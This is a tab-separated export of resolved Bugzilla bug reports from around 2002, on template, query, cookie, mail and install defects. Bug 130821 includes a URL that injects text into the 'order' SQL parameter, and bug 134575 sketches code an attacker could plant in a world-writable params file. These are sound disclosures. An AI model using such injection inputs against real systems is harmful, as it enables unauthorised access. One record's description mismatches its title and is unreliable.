130254%TAB%1015907787%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%Template tests fail for interpolated names%TAB%Template tests fail for interpolated namesThe argument to process doesn't have to be a constant string, it can have vars in it, too (buglist.cgi does htis). This causes the tests to incorrectly fail. We hosuld use File::Find or something - see my template compilation patch.  I'll attach a workaround, which has r=myk x2 - just ignore names with $ in them.
130373%TAB%1015937203%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Query/Bug List%TAB%Sorting by Target Milestone in templatized buglist.cgi generates bogus error%TAB%Sorting by Target Milestone in templatized buglist.cgi generates bogus errorIf you attempt to sort buglist.cgi output by Target Milestone, you will get an error similar to the following:   Error    The custom sort order you specified in your form submission or   cookie contains an invalid column name ms_order.sortkey.
130821%TAB%1016063517%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%buglist: "order" parameter sends unchecked SQL%TAB%buglist: "order" parameter sends unchecked SQLhttp://bugzilla.mozilla.org/buglist.cgi?field0-0-0=reporter&type0-0-0=substring&value0-0-0=jrud&order=bugs.bug_id%20AND%20ALLYOURBASEAREBELONGTOUS  SQL Error: ... GROUP BY bugs.bug_id ORDER BY bugs.bug_id AND ALLYOURBASEAREBELONGTOUS: Unknown column 'ALLYOURBASEAREBELONGTOUS' in 'order clause' at globals.pl line 222.  I noticed this at b.m.o and didn't test bugzilla-tip because landfill is down.
131345%TAB%1016212741%TAB%4579%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%Placeholder bug for revision to Bugzilla distribution of Bug Writing Guidelines ,Placeholder bug for revision to Bugzilla distribution of Bug Writing Guidelines%TAB%Placeholder bug for revision to Bugzilla distribution of Bug Writing Guidelines ,Placeholder bug for revision to Bugzilla distribution of Bug Writing GuidelinesI'd like to revise the Bugzilla version of the Bug Writing Guidelines in the next few days.   It was originally written to discourage sloppy bug writing, rather than to detail  best practices. Moreso, I've written about 1,500 more bugs since writing the original guidelines, and learned a lot more about writing non-sucky bugs that I'd like to incorporate.  Will attach a revised version for feedback and further revision in the next few days.
131521%TAB%1016308765%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Use of uninitialized value in split at /usr/lib/perl5/5.6.1/Cwd.pm line 103.%TAB%Use of uninitialized value in split at /usr/lib/perl5/5.6.1/Cwd.pm line 103.perl 5.6.1 has shipped with a Cwd.pm which gives a warning if $ENV{PATH} doesn't exist (see the above url). This is apparently fixed in bleedperl, but snice I get one of these (+ detained explanation) in the logs each time processmail is called, I figure we want to stop it.  The patch is just to set $::ENV{'PATH'} = ''; after deleting it in globals.pl (I can't produce a diff easily since I have too many other changes in my globals.pl)  I think we want to do this in 2.16 to stop warnings, and I can't think of anything which will break (Cwd.pm is part of perl, not a separate modules, so we can't just tell people to upgrade), so I'll set the milestone.
131568%TAB%1016351967%TAB%44081%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%template/default/global/header not valid HTML 4.01%TAB%template/default/global/header not valid HTML 4.01template/default/global/header not valid HTML 4.01
131659%TAB%1016401909%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%Need to fixPerms the css directory%TAB%Need to fixPerms the css directoryWe don't fixPerms the css directory, so its possible that the css files will have the wrong perms on them.  Patch coming, needed for 2.16.
131715%TAB%1016431949%TAB%46787%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%The make_options sub improperly uses regular expressions wrt default values%TAB%The make_options sub improperly uses regular expressions wrt default valuesIn several places, the make_options sub found in CGI.pl is used to create an  HTML element from a list of options and the default option(s) to set as  SELECTED.   If it's a single-select set of options, all is well.   If it's a  multi select, the default value is submitted as "val1|val2|val3..." and used as  a regular expression.  This produces incorrect results.  First of all, the "^" and "$" would have to  be used to match the entire expression.  Here is a snippet that proves it: @items = ('Foo', 'Foo Two', 'Bar', 'Bar Two', 'Baz', 'Baz Two'); $default = 'Foo|Bar';  If the $default is matched to @items as a regular expression, 4 of them match successfully even though only two options should be matched.  This same argument is true if the default values can contain any characters  that would be interpreted as meta-characters in regular expressions.  In short, it's not valid to consider pipe-delimited values to be valid "or'd"  regular expressions.   Rather, the code should split on '|' and compare the  values with the 'eq' operator.  I'll attach a diff file that demonstrates how I solved this issue after I  submit the bug.  Dan Maser Reporter
132066%TAB%1016529687%TAB%37002%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Browser-General,Documentation,User Interface%TAB%hint to enable cookies or don't require them,login page should state that you need cookies enabled for bugzilla to remember your login past the next page%TAB%hint to enable cookies or don't require them,login page should state that you need cookies enabled for bugzilla to remember your login past the next pageit seems to be impossible to use bugzilla without cookies enabled, but the bugzilla pages doesn't tell the user so. it lets the user fill in the data, then displays the login page again. the bug report never makes it into the system (but bugzilla doesn't even tell the user that it won't!) silent failure is discouraging!  suggested fix: - tell the user to enable cookies (and to configure their junkbuster to let them through) or - change bugzilla to not rely on cookies (e.g. by using hidden form params instead)
132383%TAB%1016625367%TAB%5603%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%User Interface%TAB%bugzilla should have a default favicon%TAB%bugzilla should have a default faviconThis would require help by someone with a clue about favicon structure/design ;) but I think that it would be nice if the default bugzilla install included a favicon. The image in the URL field is GPL (from the bug-buddy source, originally, I think) and might be a good starting place for any artist caring to look at something that would be a nice default for bugzilla.
132634%TAB%1016711053%TAB%34938%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting%TAB%error in report when quip option is selected%TAB%error in report when quip option is selectedGenerating a report with the quip option selected is generating the folowing  error if no quip are defined...  Use of uninitialized value in concatenation (.) or string at  C:\DL\Devlopment\BugZilla\current\mozilla\webtools\bugzilla\reports.cgi line  337 (#1) (W uninitialized) An undefined value was used as if it were already  defined. It was interpreted as a "" or a 0, but maybe it was a mistake. To  suppress this warning assign a defined value to your variables. To help you  figure out what was undefined, perl tells you what operation you used the  undefined value in. Note, however, that perl optimizes your program and the  operation displayed in the warning may not necessarily appear literally in your  program. For example, "that $foo" is usually optimized into "that " . $foo, and  the warning will refer to the concatenation (.) operator, even though there is  no . in your program. [Thu Mar 21 21:41:21 2002]  C:\DL\Devlopment\BugZilla\current\mozilla\webtools\bugzilla\reports.cgi: Use of  uninitialized value in concatenation (.) or string at  C:\DL\Devlopment\BugZilla\current\mozilla\webtools\bugzilla\reports.cgi line  337.
132893%TAB%1016802072%TAB%38316%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Email Notifications%TAB%need X-Bugzilla-Reason: Watched,Create X-Bugzilla-Reason: Watched,Create header X-Bugzilla-Watch-Reason%TAB%need X-Bugzilla-Reason: Watched,Create X-Bugzilla-Reason: Watched,Create header X-Bugzilla-Watch-ReasonIt would be nice to be able to seperate watched mail from mail that i am actually listed or cc'ed on.  The way to do this would be to -- when processing who gets mail -- send out the mail with reasons to all those who are non-watchers, and then send out reason: watched to all watchers.  The problem is this is when you are watching someone but are also listed on the bug.  When the duplicates are removed from the "people-we-need-to-email" list, we need to  keep non-watcher duplicates. sometimes that doesn't happen.
132929%TAB%1016810592%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%buglist.cgi "long format" button doesn't work%TAB%buglist.cgi "long format" button doesn't workFrom npm.webtools:  "From: Tony Sweets <aredc5NO_SPAM@netscape.net> Newsgroups: netscape.public.mozilla.webtools Subject: long_list.cgi Problems Date: Fri, 22 Mar 2002 15:38:50 -0700  Hello All  I have the current Bugzilla (2.15) code from CVS and I'm having a problem with the "Long Format" report. If I do a query, then hit the "Long Format" Button after my query results appear, an error occurs. The error message says "You'd have more luck if you gave me some bug numbers"  I've looked around the code (I'm not a Perl Programmer! I'm a Java Guy) and I can't find where $buglist is getting assigned values for this perticular situation. I've notice that the cookie "BUGLIST" is populated . So my quick solution was to append $::COOKIE{"BUGLIST"} to the $buglist array at line 63 in long_list.cgi  This works, but I'm sure if this a valid or if it breaks anything.  --Tony "  Thats not valid - we need to push $vars->{buglist} to the template so that its in the form. The actual template already tries to us ethis param, but the cgi never supplies it.
132939%TAB%1016812633%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%"zarro bugs found is no more","zarro bugs found" is no more%TAB%"zarro bugs found is no more","zarro bugs found" is no moreThe template uses .count, it needs to use .size (line 96ish)
133063%TAB%1016903565%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Standardize setting and clearing of browser cookies,Provide standard API for setting and clearing browser cookies%TAB%Standardize setting and clearing of browser cookies,Provide standard API for setting and clearing browser cookiesCurrently cookies are set and cleared in a number of different files:  $ grep -l -i set-cookie *  2> /dev/null CGI.pl buglist.cgi colchange.cgi createaccount.cgi post_bug.cgi query.cgi relogin.cgi  Most of the time, the date used to set a cookie is an arbitrary one in the future (30-Jun-2029) and the date used to clear a cookie is an arbitrary one in the past (30-Jun-80) [note the lack of a century in the year].  Cookie setting and clearing should really be done through a standard API function (in CGI.pl or elsewhere) so that these dates may be adjusted easily without going through every file and updating them.  See RFC 2109 (HTTP State Management Mechanism) and RFC 2965 (HTTP State Management Mechanism) for details on cookies.
133200%TAB%1017002302%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%mass change removes dependencies%TAB%mass change removes dependenciesWhen using the mass change form, process_bug.cgi does not use the dependsonaction or blockedaction to perform the correct dependency changes, and acts simply as if 'makeexact'.  The result when nothing is entered into the depends/blocks fields is that it removes dependancies.  Steps to reproduce: 1) Query a bug with a known dependency 2) Select 'Change several bugs at once' 3) Type in a comment only and click submit 4) Display the bug; and view Bug Activity.  Actual Results: Comment added to bug, and bugs dependencies have been removed  Expected Results: Comment added to bug.  Workaround: remove the dependson/blocked form elements from tempate/default/buglist/change-form.tmpl  As an aside, it looks like this functionality is yet to be introduced in bug 42101.
133201%TAB%1017003589%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%syntax error in show_bug.cgi%TAB%syntax error in show_bug.cgiThe templatised show_bug.cgi causes a syntax error in IE, due to quoting in template/default/show/show_bug.html.tmpl (line 409)  -             onchange="if ((this.value != "[% bug.assigned_to_email %]") &&   +             onchange="if ((this.value != '[% bug.assigned_to_email %]') &&
133206%TAB%1017005734%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%mass change uses 'severity' rather than 'bug_severity'%TAB%mass change uses 'severity' rather than 'bug_severity'process_bug.cgi expects 'bug_severity' to contain the severity, as is the case in show_bug.cgi .    tempate/default/buglist/change-form.tmpl uses 'severity', which results in severity not being changed when using mass change.
133207%TAB%1017006066%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%mass confirming bugs fails%TAB%mass confirming bugs failsTheres a missing " after the action, so you get "unknown action confirm>".
133210%TAB%1017007828%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%checksetup uses $::params%TAB%checksetup uses $::paramsIn bug 96675 (R1.16 blocker), the patch uses $::params rather than $::param.
133273%TAB%1017041373%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%URL field not linked after show_bug.cgi templatization%TAB%URL field not linked after show_bug.cgi templatizationThe template uses bug.url but the URL is actually stored in bug.bug_file_loc.  Template also includes use of arcane 'FILTER url'.  Patch coming shortly.
133276%TAB%1017042185%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Check for data in 'groups' variable in show_bug.cgi template doesn't work%TAB%Check for data in 'groups' variable in show_bug.cgi template doesn't workThe check for existance of data in the 'groups' variable doesn't work in the show_bug.html.tmpl template.  It should use |IF groups.size > 0| instead of simply |IF groups|.  Patch to follow shortly.
133333%TAB%1017054487%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%'Create a New Attachment' link is broken after show_bug.cgi templatization%TAB%'Create a New Attachment' link is broken after show_bug.cgi templatizationThe 'Create a New Attachment' link is broken on show_bug.cgi after it was templatized.  The problem is that the 'bugid' parameter was not passed to attachment/list.atml.  Patch to follow shortly.
133372%TAB%1017065721%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%Target Milestone URL should be escaped in templates using 'FILTER uri'%TAB%Target Milestone URL should be escaped in templates using 'FILTER uri'The targetmilestoneurl should be filtered using 'FILTER uri' in template/default/show/show_bug.html.tmpl.
133389%TAB%1017069736%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%show_bug does not select component%TAB%show_bug does not select componentshow_bug.cgi does not select the bugs component, resulting in commit changing the component to the first of the product.
133406%TAB%1017075978%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%errors if quotes in short_desc%TAB%errors if quotes in short_descshow_bug.cgi does not filter quotes in the bug short_desc, resulting in invalid html.
133423%TAB%1017080741%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%Audit global/header for FILTER usage,Audit templates for FILTER usage%TAB%Audit global/header for FILTER usage,Audit templates for FILTER usage<justdave> just about nothing from "bug.*" should be allowed to be displayed without filtering  This may affect the title passed from show_bug.html.tmpl to global/header, which is then used unfiltered.
133425%TAB%1017081031%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Audit show_bug.html.tmpl for FILTER usage%TAB%Audit show_bug.html.tmpl for FILTER usageWith the templatized show_bug, I just got a summary truncated, probably because it contains quoted text: "..." 
133559%TAB%1017137481%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla Helper,Creating/Changing Bugs%TAB%Bugzilla Helper should be enter_bug.cgi template%TAB%Bugzilla Helper should be enter_bug.cgi templateBugzilla Helper should be a "simple bug entry form" mozilla.org-specific template for enter_bug.cgi. Now that enter_bug.cgi has been templatised, this should be quite simple.
133833%TAB%1017240321%TAB%5898%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%User Interface%TAB%Error in templatized version of userprefs.cgi%TAB%Error in templatized version of userprefs.cgiIn userprefs.cgi, the email value of 'ExcludeSelf' is mistakenly written as  'excludeself' which causes the setting for receiving email for changes you make to never be saved properly. Attaching a patch fixing the problem for me.
133862%TAB%1017250686%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Interface%TAB%bugzilla index page doesn't focus text field%TAB%bugzilla index page doesn't focus text fieldThe templatised index page doesn't focus the textfield like the old page did.
134022%TAB%1017314710%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%PERFORMANCE: deleting old login cookies locks login checks%TAB%PERFORMANCE: deleting old login cookies locks login checksCGI.pl's confirm_login() function runs a query to delete old login cookies whenever a script runs that function and the user is not logged in (i.e. quietly_check_login does not return a true value).  The query takes a number of seconds to complete (I saw these queries running for 15-26 seconds on b.m.o.) and causes quietly_check_login()'s user authentication queries to lock waiting for it to complete, which slows down overall Bugzilla performance.  The login cookies deletion query should not run on such a regular basis.
134198%TAB%1017387135%TAB%47800%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Documentation%TAB%addition for step_by_step installation file%TAB%addition for step_by_step installation fileChapter 3.2.12 HTTP Server  I suggest updating:  ---  With apache you'll also want to make sure that within the 	access.conf file the line:  Options ExecCGI is in the stanza that covers the directories into which 	you intend to put the bugzilla .html and .cgi files.  ---  To:  ---  With apache you'll also want to make sure that within the 	access.conf file the lines:  Options ExecCGI  AllowOverride Limit are in the stanza that covers the directories into which 	you intend to put the bugzilla .html and .cgi files.  AllowOverride Limit allows the use of a Deny statement in the .htaccess file  generated by checksetup.pl    ---
134465%TAB%1017510680%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Installation & Upgrading%TAB%We die if the admin email address doesn't match the regexp%TAB%We die if the admin email address doesn't match the regexpWe die, rather than prompting again. This isn't very friendly.
134474%TAB%1017520787%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Creating/Changing Bugs%TAB%mass change form doesn't take product groups into account,mass change form offers too many groups%TAB%mass change form doesn't take product groups into account,mass change form offers too many groupsThe pre-templisation code appears to only displayed a group if you were in the group, _and_ the group was either not a product group, or there was at least one bug present form that product (This is from reading old code, I haven't actually tried this.)  This seems wrong, since then you could make a bug not in that product a member of a product group. This is definately wrong for the current code, though, which doesn't care about buggroups at all.  Beware of bug 117718 when fixing this - we should probably duplicate the 'is this on the right product' check there, at least for single bugs.
134562%TAB%1017586900%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Query/Bug List%TAB%taint error in buglist.cgi%TAB%taint error in buglist.cgiWhilst generating a buglist for a query containing 'votes', Bugzilla returns a software error "Attempted to send tainted string 'SELECT DISTINCT ...' to the database at globals.pl line 235.  The taint error is introduced at buglist.cgi line 1193.
134571%TAB%1017591223%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Reporting/Charting%TAB%client-side image maps in showdependencygraph.cgi%TAB%client-side image maps in showdependencygraph.cgiDependency graphs use server-side image maps in order that a user can click on a bug's node to bring up the bug's details.  When using 'dot' (bug 120537) or the GraphViz module (bug 134565), the image map data is able to be generated in time to be included as a client-side image maps.
134575%TAB%1017595281%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%defparams.pl::WriteParams makes data directory world writable%TAB%defparams.pl::WriteParams makes data directory world writableIf the dir isn't there, it tires to create it, and make it world writable. This is a bad idea - if it doesn't exist, we should die.  The params file is also world writable, which is even a worse idea, because even with a webservergroup, the perms are 771, so if you know the name of the file, a local user can overwrite it, and add code to do whatever they want:  if ($::userid = 12345) { $::usergroupset = whatever; }  for example. How can defparams.pl check if a webservergroup was specified?  How about we move the WriteParams stuff into checksetup.pl? This would also mean that params can be used in checksetup in a cleaner way.  Changing params would then just copy the perms on the existing file. This wouldn't help the non-webservergroup case, though - see bug 107513.
135145%TAB%1017809981%TAB%35981%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Reporting/Charting,Bugzilla-General%TAB%Graphs generated by local webdot are huge%TAB%Graphs generated by local webdot are hugeWe have a local installation of bugzilla, and installed graphviz+webdot locally in order to get graphs functioning. However, the graphs generated are huge.  In order to make it work properly (i.e. only create a graph as big as necessary) the following change needs to be made to showdependencygraph.cgi (thanks to Dan Maser - dan@maser.com):  The line   graph [URL="${urlbase}query.cgi", rankdir=$::FORM{'rankdir'} size=64,64]  needs to be changed to  graph [URL="${urlbase}query.cgi", rankdir=$::FORM{'rankdir'}]  This at least works for me.
135291%TAB%1017840406%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%template version strings break non-xml templates,template version strings break templates%TAB%template version strings break non-xml templates,template version strings break templatesThe recent template version strings  (e.g. <!-- 1.0@bugzilla.org --> ) which have been inserted into all templates break non-xml templates, specificually the follow mail templates (from bug 23067) token/emailchangenew.txt.tmpl token/emailchangeold.txt.tmpl token/tokencancel.txt.tmpl  John Vandenberg Reporter
135449%TAB%1017904905%TAB%20977%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List%TAB%Allow preset queries to override the last sort order%TAB%Allow preset queries to override the last sort orderIt would be nice, if you could have preset queries that would not use the lastorder parameter.   This would be helpfull in situations, where you always want to have a preset query sorted by for example importance. Currently, the previously used sort order will be the first one (the only one?) used.
135469%TAB%1017911917%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Reporting/Charting%TAB%Missing version in show/dependency-graph.html.tmpl (tree is a-burinin')%TAB%Missing version in show/dependency-graph.html.tmpl (tree is a-burinin')It would be nice, if you could have preset queries that would not use the lastorder parameter.   This would be helpfull in situations, where you always want to have a preset query sorted by for example importance. Currently, the previously used sort order will be the first one (the only one?) used.
135473%TAB%1017912676%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs,attachment and request management%TAB%Using back button after failure on attachment.cgi does not disable radio buttons when patch checkbox is checked%TAB%Using back button after failure on attachment.cgi does not disable radio buttons when patch checkbox is checkedWhen the form on attachment.cgi (action=enter) is submitted and an error page is displayed, the user is told to hit the 'Back' button to correct the mistake.  However, if the user had already checked the 'patch' checkbox, the radio buttons will not be disabled when the page is reloaded from hitting 'Back'.  Essentially, an onLoad event is needed that checks whether the patch checkbox is already checked, and if so, should call setContentTypeDisabledStat().  NOTE: Since setContentTypeDisabledStat() is defined in the body of the web page, it may be necessary to move it up into the HEAD section to get an onLoad event to work properly.  (I'm not sure about this, though.)
135543%TAB%1017925721%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%@Support::Templates::testitems does not list all templates%TAB%@Support::Templates::testitems does not list all templatesThe @Support::Templates::testitems module variable does not list every template stored under the templates/default/ directory.  The Support::Templates module should probably use a glob to pick up all of the files rather than pattern- matching through perl scripts.  I will attach a patch to t/004template.t that demostrates this by checking for version strings in all template files using a glob() instead of @Support::Templates::testitems.  The following templates were found not to have version strings (I'll open another bug for this later):  buglist/buglist-rdf.rdf.tmpl buglist/buglist-simple.html.tmpl buglist/buglist.html.tmpl buglist/change-form.tmpl buglist/table.tmpl prefs/account.tmpl prefs/email.tmpl prefs/footer.tmpl prefs/permissions.tmpl show/navigate.html.tmpl
135545%TAB%1017926223%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%More templates with missing versions%TAB%More templates with missing versionsIn the course of discovering Bug 135543, I found more templates without version numbers.  They are:  buglist/buglist-rdf.rdf.tmpl buglist/buglist-simple.html.tmpl buglist/buglist.html.tmpl buglist/change-form.tmpl buglist/table.tmpl prefs/account.tmpl prefs/email.tmpl prefs/footer.tmpl prefs/permissions.tmpl show/navigate.html.tmpl
135639%TAB%1017965766%TAB%13272%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Documentation%TAB%Update section about command line queries%TAB%Update section about command line queriesIf you read http://www.bugzilla.org/docs/html/cmdline.html , you will notice that it says that you need to download the files manually (e.g. using wget). This is no longer necessary since the files are now in cvs, see http://lxr.mozilla.org/mozilla/source/webtools/bugzilla/contrib/cmdline
135666%TAB%1017977546%TAB%48358%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Creating/Changing Bugs%TAB%Creating bugs: OS detection doesn't work for Internet Explorer, Win NT 4.0%TAB%Creating bugs: OS detection doesn't work for Internet Explorer, Win NT 4.0If a new bug is entered from a PC running Windows NT 4.0 and Internet Explorer,  the operating system cannot be detected (you get 'other').  The problem is that the browser identifies itself as   Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 4.0) which does not match in sub pickos in enter_bug.cgi.  One solution ist to change the line             /Mozilla.*\(Windows.*NT/        && do {return "Windows NT";}; to             /Mozilla.*Windows.*NT/          && do {return "Windows NT";}; so that no '(' is required the string 'Windows'.
135707%TAB%1017990455%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla-General%TAB%normalize template filenames%TAB%normalize template filenamesTemplate filenames are a mess and should be normalized.  For templates supporting multiple formats the following convention has been established:  SCRIPTNAME.EXTENSION.tmpl (for the default format) SCRIPTNAME-FORMATNAME.EXTENSION.tmpl (for other formats)  For other template files we talked about the following convention:  complete documents: NAME.EXTENSION.tmpl document fragments: NAME.tmpl  As we begin to build more non-HTML templates, however, I think we'll find it useful to identify the content-type of template fragments, so I suggest we do the following:  complete documents: NAME.EXTENSION.tmpl document fragments: NAME.EXTENSION.tmpl  One other note: In discussions we decided to use hyphens to separate multiple words in template names, i.e. display-something.html.tmpl.
135812%TAB%1018010163%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Administration,Email Notifications%TAB%mail template administration,Add params for the email address that bugmail comes from,Add a 'mailfrom' parameter to unify bugmail originating address%TAB%mail template administration,Add params for the email address that bugmail comes from,Add a 'mailfrom' parameter to unify bugmail originating addressThe mail templates introduced for the change of email address feature (bug 23067) are from 'bugzilla-admin-daemon' by default.  Each of these needs to be modified by the maintainer to append a domain.  The following could be added to ease the maintainers job: 1) A global email header, which is included from any mail template.  This single file could then be documented, and a simple check placed in checksetup.pl to inform the maintainer that the mail header has not been customised. 2) A 'Bugzilla mail domain' param, which could then be automaticually appended to 'bugzilla-admin-daemon'.
135815%TAB%1018010709%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%Regression on CGI.pl for link to showvotes.cgi%TAB%Regression on CGI.pl for link to showvotes.cgiRevsion 1.143 of CGI.pl (checked in for Bug 126456) contained a regression to showvotes.cgi (which was removed for Bug 117760) during templatization.
135817%TAB%1018010862%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Administration%TAB%templatise Token.pm%TAB%templatise Token.pmtemplatise Token.pm
135820%TAB%1018011134%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Administration%TAB%token cancellation message are not user-friendly%TAB%token cancellation message are not user-friendlyToken cancellation messages are overly terse and technical to be effective.  From bug 23067 comment 98:  >+Subject: [% tokentype %] token cancelled >+ >+A token was cancelled from [% remoteaddress %].   >+If you did not request this, it could be either an honest  >+mistake or the result of a malicious hack attempt.    This is both cryptic and scary; we shouldn't be talking about tokens, (I don't know if I requested a 'token cancellation' - I'm just trying to change my email address) and we shouldn't be talking about "malicious hack attempts" without qualifying it. e.g. "someone breaking into your Bugzilla account" is better.
135836%TAB%1018012588%TAB%22360%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%User Accounts,attachment and request management%TAB%change requests should inlcude expiration details,change requests should include expiration details%TAB%change requests should inlcude expiration details,change requests should include expiration detailsThe email change request send emails to both the new and old email address, providing directions, however it does not include a date after which those directions will no longer work.
136003%TAB%1018117704%TAB%29274%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%two extra spaces after every comment%TAB%two extra spaces after every commentcomments.tmpl has:    <pre>     [%- quoteUrls(comment.body) -%]   </pre>  I added the - bits to stop new lines, but it still adds the spaces, since the generated html is:    <pre>asda  </pre>  This is because PRE_CHOMP removes whitespace back to the end of the preceeding line, but POST_CHOMP (which we don't use by default for some reason I don't really understand) only chomps to the beginning of teh next line.  The fix is to just move this all only one single line, so I'll attach the trivial patch.
136156%TAB%1018240572%TAB%45468%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Installation & Upgrading,Email Notifications%TAB%system() won't work from .cgi on Windows%TAB%system() won't work from .cgi on WindowsBugzilla 2.14.1, Windows2000, Apache, ActivePerl  All the system() calls from .cgi scripts (like system "processmail.pl") will  not run anything. If it is run from commandline, everything worked fine. If run  from cgi script by the webserver, system() calls just did not execute.  Workaround: Besides renaming the perl scripts to .pl and editing .cgi scripts  to call them (and editing shebang lines) I needed to put cmd.exe into bugzilla  directory and also add "AddHandler cgi-bin .pl" directive into httpd.conf of  Apache.  I know it is not in fact the bug of Bugzilla but ActivePerl and Apache - but it  would save me quite a chunk of time spent debugging if it was written in the  documentation.
136180%TAB%1018250511%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Email Notifications%TAB%'FILTER html' used in *.txt.tmpl files instead of 'FILTER uri'%TAB%'FILTER html' used in *.txt.tmpl files instead of 'FILTER uri'The patch for Bug 133423 added 'FILTER html' to variables in:    template/default/token/emailchangenew.txt.tmpl   template/default/token/emailchangeold.txt.tmpl  However, the output of these variables appears as part of a URL and should be filtered using 'uri' instead of 'html'.  Patch to follow shortly.
136225%TAB%1018263461%TAB%14303%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Query/Bug List,User Interface%TAB%Make summary a link in buglists,Make summary a link in buglists (avoids horizontal scrolling)%TAB%Make summary a link in buglists,Make summary a link in buglists (avoids horizontal scrolling)Because horizontal scrolling is a pain, it'd be really nice if the summary was also linked to the bug. As it is, you scroll right to read the summaries, and then you need to scroll all the way left to click the id in order to go to the bug. This gennerally occurs when some of the columns in the buglist are really wide.
136227%TAB%1018263628%TAB%33620%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Testing Suite%TAB%Perl syntax in runtests.sh causes error message when passing in arguments%TAB%Perl syntax in runtests.sh causes error message when passing in argumentsWhen '--verbose' is passed into runtests.sh, the following error message occurs:  ./runtests.sh: [: ==: binary operator expected  String equality is '=' under bash.  Patch to follow shortly.
136325%TAB%1018304008%TAB%20977%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla-General%TAB%bug_emal.pl uses /usr/bin/perl instead of ...bonsaitools/bin/perl,bug_email.pl uses /usr/bin/perl instead of ...bonsaitools/bin/perl%TAB%bug_emal.pl uses /usr/bin/perl instead of ...bonsaitools/bin/perl,bug_email.pl uses /usr/bin/perl instead of ...bonsaitools/bin/perlSince the default perl is /usr/bonsaitools/bin/perl the perl files in contrib directory sould also use that one. At least bug_email.pl, bugzilla_email_append.pl and gnats2bz.pl use the /usr/bin/perl.
